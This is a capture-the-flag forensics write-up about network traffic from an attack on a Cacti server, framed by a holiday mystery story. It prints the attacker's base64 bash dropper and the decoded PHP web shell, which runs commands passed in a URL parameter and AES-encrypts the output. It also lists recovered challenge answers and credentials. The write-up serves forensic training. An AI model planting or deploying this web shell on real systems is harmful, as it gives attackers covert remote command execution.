
---

# A Trail of Snow and Deception

> **Description:** Oliver Mirth, Tinselwick's forensic expert, crouched by the glowing lantern post, tracing the shimmerdust trail with a gloved finger. It led into the snowdrifts, then disappeared, no footprints, no sign of a struggle. He glanced up at the flickering Snowglobe atop Sprucetop Tower, its light wavering like a fading star. "Someone’s been tampering with the magic," Oliver murmured. "But why?" He straightened, eyes narrowing. The trail might be gone, but the mystery was just beginning. Can Oliver uncover the secret behind the fading glow?

## Challenge Overview

We are provided with a `.pcap` file containing network traffic. Our goal is to analyze the capture to uncover details about an attack on a Cacti instance, including versioning, credentials, and malicious payloads.

---

## 1. Reconnaissance

### What is the Cacti version in use?

We filtered the HTTP stream to find the initial requests to the Cacti server. In the source code of the login page (or main dashboard), we found the version defined in a JavaScript variable.

**Evidence:**

```javascript
var cactiVersion='1.2.28'; 

```

**Answer:** `1.2.28`

### What is the set of credentials used to log in?

We searched for `POST` requests directed at the login endpoint. Inspecting the body of the login request revealed the username and password parameters.

**Evidence:**

```http
__csrf_magic=sid%3A31f2e900cfdebb14d4e31670308d7efb2650f672%2C1764692067&action=login&login_username=marnie.thistlewhip&login_password=Z4ZP_8QzKA

```

**Answer:** `marnie.thistlewhip:Z4ZP_8QzKA`

---

## 2. Analyzing the Attack Vector

### Three malicious PHP files are involved. What are they?

By following the exploitation flow in the network stream, we observed the attacker interacting with three distinct PHP files. Sorted by their appearance in the stream, they are:

**Answer:** `JWUA5a1yj.php,ornF85gfQ.php,f54Avbg4.php`

### What file gets downloaded during the exploitation process?

Analyzing the exploit payload, we found a shell command used to create a malicious PHP file. The attacker echoed a base64 encoded string and redirected the decoded output to a file.

**Exploitation Step:**

```bash
#!/bin/bash
echo PD9waHAgJEE0Z1ZhR3pIID0gImtGOTJzTDBwUXc4ZVR6MTdhQjR4TmM5VlVtM3lIZDZHIjskQTRnVmFSbVYgPSAicFo3cVIxdEx3OERmM1hiSyI7JEE0Z1ZhWHpZID0gYmFzZTY0X2RlY29kZSgkX0dFVFsicSJdKTskYTU0dmFnID0gc2hlbGxfZXhlYygkQTRnVmFYelkpOyRBNGdWYVFkRiA9IG9wZW5zc2xfZW5jcnlwdCgkYTU0dmFnLCJBRVMtMjU2LUNCQyIsJEE0Z1ZhR3pILE9QRU5TU0xfUkFXX0RBVEEsJEE0Z1ZhUm1WKTtlY2hvIGJhc2U2NF9lbmNvZGUoJEE0Z1ZhUWRGKTsgPz4=|base64 --decode > f54Avbg4.php

```

**Answer:** `f54Avbg4.php`

---

## 3. Payload Analysis & Decryption

### What variable stores the result of the executed system command?

We decoded the base64 content of the dropped file (`f54Avbg4.php`) to understand its functionality.

**Decoded PHP Code:**

```php
<?php 
$A4gVaGzH = "kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G"; // Key
$A4gVaRmV = "pZ7qR1tLw8Df3XbK";                 // IV
$A4gVaXzY = base64_decode($_GET["q"]);
$a54vag = shell_exec($A4gVaXzY);                 // Execution
$A4gVaQdF = openssl_encrypt($a54vag,"AES-256-CBC",$A4gVaGzH,OPENSSL_RAW_DATA,$A4gVaRmV);
echo base64_encode($A4gVaQdF); 
?>

```

The script executes a command and encrypts the output. The variable handling the encrypted response is `$A4gVaQdF`.

**Answer:** `$A4gVaQdF`

### Decrypting Traffic

To find the answers to the remaining questions, we extracted the AES key and IV from the malicious script above:

* **Key:** `kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G`
* **IV:** `pZ7qR1tLw8Df3XbK`
* **Mode:** AES-256-CBC

We applied this decryption to the subsequent command outputs found in the traffic.

### What is the system machine hostname?

Decrypting the command output where the attacker queried the system identity revealed the answer.

**Answer:** `www-data`

### What is the database password used by Cacti?

Decrypting the output where the attacker dumped the configuration (likely `config.php`), we found the database connection details.

**Evidence:**

```php
$database_password = 'zqvyh2fLgyhZp9KV';

```

**Answer:** `zqvyh2fLgyhZp9KV`